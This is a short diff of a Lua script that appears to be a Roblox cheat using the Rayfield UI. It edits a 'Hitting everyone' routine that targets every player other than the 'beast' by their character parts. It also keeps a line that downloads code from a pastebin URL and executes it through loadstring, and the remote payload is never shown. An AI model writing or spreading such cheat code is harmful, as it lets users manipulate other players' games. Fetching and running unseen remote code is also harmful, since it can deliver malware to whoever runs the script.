@@ -853,7 +853,7 @@ t4:CreateButton({
         end
 
         print("Hitting everyone")
-        for _, plr in pairs(Players:GetPlayers()) do
+        for _, plr in pairs(game.Players:GetPlayers()) do
             if plr ~= beast and plr.Character then
                 local torso = plr.Character:FindFirstChild("Torso") or plr.Character:FindFirstChild("UpperTorso")
                 local hrp = plr.Character:FindFirstChild("HumanoidRootPart")
@@ -1527,6 +1527,7 @@ t5:CreateButton({
 Rayfield:LoadConfiguration()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/UjVjsnQC"))()
+
 
 
 
